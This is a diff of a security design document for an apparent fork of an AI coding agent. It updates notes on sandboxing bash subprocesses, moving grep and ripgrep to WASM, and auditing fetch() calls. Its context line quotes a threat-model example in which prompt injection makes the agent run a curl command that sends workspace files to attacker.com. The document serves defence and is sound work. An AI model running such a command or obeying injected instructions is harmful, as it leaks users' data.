@@ -82,8 +82,9 @@ injection or otherwise) to run `curl https://attacker.com -d "$(cat /workspace/s
 can exfiltrate data regardless of `mode: internal-only`.
 
 **Fix implemented**: `OPENCODE_SPAWN_SANDBOX=1` (baked into `Dockerfile.analysis`) wraps
-bash subprocesses in a network namespace via bwrap/unshare. `Process.spawn` (used by grep,
-ripgrep) also sandboxed via `sandboxedCmd()` in `util/process.ts`.
+bash subprocesses in a network namespace via bwrap/unshare. bash.ts has inline
+`sandboxedArgs()` that pre-wraps commands before passing to the Effect ChildProcessSpawner.
+Ripgrep/grep are now WASM-based (in-process worker, no subprocess) — sandbox is N/A for them.
 
 ### 2. Prompt injection via externally fetched content (MEDIUM, partially addressed)
 
@@ -151,27 +152,25 @@ opencode process (parent, full network namespace)
       [crosses process boundary — sandbox applied here]
         ├── bash tool          → bwrap/unshare sandbox (sandboxedArgs() in bash.ts)
         ├── ripgrep execution  → bwrap/unshare sandbox (sandboxedCmd() in process.ts)
-        ├── grep tool          → bwrap/unshare sandbox (sandboxedCmd() in process.ts)
+        ├── grep/ripgrep       → WASM in-process worker (no subprocess; sandbox N/A)
         ├── LSP servers        → direct child_process.spawn; no network needed (gap)
-        └── future tools       → automatically sandboxed if they use Process.spawn
-
-  [ripgrep binary DOWNLOAD is fetch() in parent process, not a subprocess —
-   goes through auditedFetch(), not the spawn sandbox]
+        └── future tools       → check whether they use ChildProcessSpawner or Process.spawn
 ```
 
 #### Current subprocess spawn coverage
 
-| Spawn site | Uses Process.spawn? | Notes |
+| Spawn site | Mechanism | Notes |
 |---|---|---|
-| `bash.ts` | No — direct `child_process.spawn` | **Sandboxed inline** via `sandboxedArgs()` |
-| `tool/grep.ts` | Yes | Covered by `Process.spawn` → `sandboxedCmd()` |
-| `file/ripgrep.ts` | Yes | Covered by `Process.spawn` → `sandboxedCmd()` |
-| `lsp/server.ts` | No — direct `child_process.spawn` | LSP needs no network; sandbox gap acceptable |
-| `pty/index.ts` | No — bun-pty | Interactive TUI terminal; not AI-controlled |
-| `session/prompt.ts` | No — direct `child_process.spawn` | Shell for prompt expansion; no user commands |
+| `bash.ts` | Effect `ChildProcessSpawner` | **Sandboxed inline** via `sandboxedArgs()` before ChildProcess.make |
+| `tool/grep.ts` | WASM worker (Ripgrep.Service) | No subprocess; sandbox N/A |
+| `file/ripgrep.ts` | WASM worker | No subprocess; sandbox N/A |
+| `lsp/server.ts` | direct `child_process.spawn` | LSP needs no network; sandbox gap acceptable |
+| `pty/index.ts` | bun-pty | Interactive TUI terminal; not AI-controlled |
+| `session/prompt.ts` | `Process.spawn` | Shell for prompt expansion; `sandboxedCmd()` applies |
 
-Future upstream tools using `Process.spawn` → automatically covered.
-Future upstream tools using direct `child_process.spawn` → NOT covered (gap).
+`util/process.ts` still has `sandboxedCmd()` for callers that use `Process.spawn`.
+bash.ts no longer uses `Process.spawn` — it has its own `sandboxedArgs()` for the Effect path.
+Future upstream tools using `ChildProcessSpawner` directly → NOT sandboxed (gap unless they add their own wrapping).
 
 #### Mechanism
 
@@ -212,7 +211,7 @@ Overridable at runtime: `docker run -e OPENCODE_SPAWN_SANDBOX=0 ...`
 
 - Opt-in via env var, default off → zero behavior change for existing users
 - Core change is in `util/process.ts` (single file) + `flag.ts`
-- bash.ts uses inline `sandboxedArgs()`; could be unified through Process.spawn later
+- bash.ts uses inline `sandboxedArgs()` with Effect ChildProcessSpawner
 - Could be proposed as an experimental security feature
 
 ### Audit all internal `fetch()` calls — IMPLEMENTED
@@ -227,7 +226,7 @@ creating blind spots in the audit trail:
 | Provider SDK calls | LLM provider endpoints | ✓ | ✓ |
 | `session/instruction.ts` | Remote instruction URLs from config | ✓ | ✓ |
 | `skill/discovery.ts` | Skill index + skill files | ✓ | ✓ |
-| `file/ripgrep.ts` | ripgrep binary from github.com | n/a | n/a |
+| `file/ripgrep.ts` | WASM bundled (no runtime download) | n/a | n/a |
 | `share/share-next.ts` | opencode.ai share service | ✗ | ✗ |
 
 **Implemented**: `src/util/fetch.ts` exports `auditedFetch(url, init?, source?)` that:
@@ -236,12 +235,14 @@ creating blind spots in the audit trail:
 3. Throws on blocked URLs
 4. Logs to `auditLogger.logFetchRequest()` on completion
 
-`instruction.ts` and `skill/discovery.ts` now route through `auditedFetch()`.
+`instruction.ts` and `skill/discovery.ts` now route through `auditedUrl()` (the Effect
+variant of `auditedFetch`). `instruction.ts` was migrated to Effect `HttpClient` by upstream;
+the fork adds `auditedUrl` before the `http.execute` call — if blocked, returns empty string.
 `block_domain_regex` in SecurityConfig now blocks these paths too, not just
 webfetch/websearch/provider.
 
-**ripgrep download**: the binary is pre-installed via EPEL in the container;
-the runtime download path in `file/ripgrep.ts` is never reached. No change needed.
+**ripgrep**: now WASM-bundled (no binary download at runtime). The `file/ripgrep.ts` fetch
+path is no longer relevant. EPEL ripgrep install in the container may be unnecessary.
 
 **share**: user-initiated upload; acceptable. Not changed.
 
